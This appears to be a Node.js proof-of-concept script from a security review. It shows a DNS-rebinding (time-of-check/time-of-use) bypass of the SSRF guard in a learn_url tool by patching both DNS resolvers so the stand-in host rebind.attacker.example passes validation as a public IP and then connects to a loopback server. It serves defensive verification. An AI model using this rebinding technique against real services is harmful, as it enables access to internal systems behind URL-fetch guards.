// Scratch repro (read-only w.r.t. src/): proves the recorded DNS-rebinding
// residual in fetchPublicUrl through the REAL learn_url tool entry.
//
// Seam under test: knowledge.ts:337 resolves the host with dns.promises.lookup
// and validates the answer; knowledge.ts:344 then calls global fetch (undici),
// which resolves the SAME hostname a SECOND time inside net.connect. Nothing
// binds answer #1 to the connection, so an attacker's authoritative DNS with
// TTL 0 can answer query #1 with a public IP and query #2 with 127.0.0.1.
// Here the two patched resolvers stand in exactly for those two attacker answers.
import dns from 'node:dns'
import http from 'node:http'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import { learnUrlTool } from '../../cline/blackrose/src/tools/knowledge.ts'

const ATTACK_HOST = 'rebind.attacker.example' // never resolves in real DNS
let hit = null

// The "internal" service the attacker wants to reach: a loopback HTTP server.
const server = http.createServer((req, res) => {
  hit = { url: req.url, host: req.headers.host, ua: req.headers['user-agent'] }
  res.setHeader('content-type', 'text/html')
  res.end('<html><body>INTERNAL SECRET PAGE</body></html>')
})
await new Promise((ok) => server.listen(0, '127.0.0.1', ok))
const port = server.address().port

// Attacker authoritative DNS, TTL 0: two queries, two different answers.
// Query #1 - the guard's dns.promises.lookup (knowledge.ts:337) - sees PUBLIC.
const origPromises = dns.promises.lookup.bind(dns.promises)
dns.promises.lookup = async (host, opts) =>
  host === ATTACK_HOST ? [{ address: '93.184.216.34', family: 4 }] : origPromises(host, opts)
// Query #2 - undici's connect-time resolution (net.connect default dns.lookup,
// the callback API) - sees the REBOUND private address.
const origLookup = dns.lookup
dns.lookup = function (host, opts, cb) {
  if (typeof opts === 'function') { cb = opts; opts = {} }
  if (host === ATTACK_HOST) {
    // Node >=20 runs Happy Eyeballs (autoSelectFamily default true): net.connect
    // asks with all:true and expects an array of { address, family }.
    const addr = { address: '127.0.0.1', family: 4 }
    process.nextTick(() => cb(null, opts?.all ? [addr] : addr.address, opts?.all ? undefined : addr.family))
    return
  }
  return origLookup.call(dns, host, opts, cb)
}

// Drive the real tool with a scratch context (same shape as the sweep-2 tests).
const dir = fs.mkdtempSync('br-rebind-')
const ctx = { cwd: dir, dataDir: dir, askApproval: async () => false }
const r = await learnUrlTool.run({ url: `http://${ATTACK_HOST}:${port}/secret` }, ctx)

console.log('learn_url result:', JSON.stringify(r))
console.log('attack-server hit:', JSON.stringify(hit))
server.close()

if (hit) {
  assert.equal(r.isError, false, 'guard must have PASSED for the exploit to land')
  assert.match(hit.url, /\/secret/)
  console.log('EXPLOIT CONFIRMED (TOCTOU dimension): the guard validated 93.184.216.34 ' +
    '(public) at check time, but the TCP connect re-resolved ' + ATTACK_HOST +
    ' to 127.0.0.1 and delivered the request to a loopback service.')
  process.exit(0)
}
console.log('NOT exploited in this run (guard refused or no hit) - record honestly.')
process.exit(r.isError ? 2 : 3)
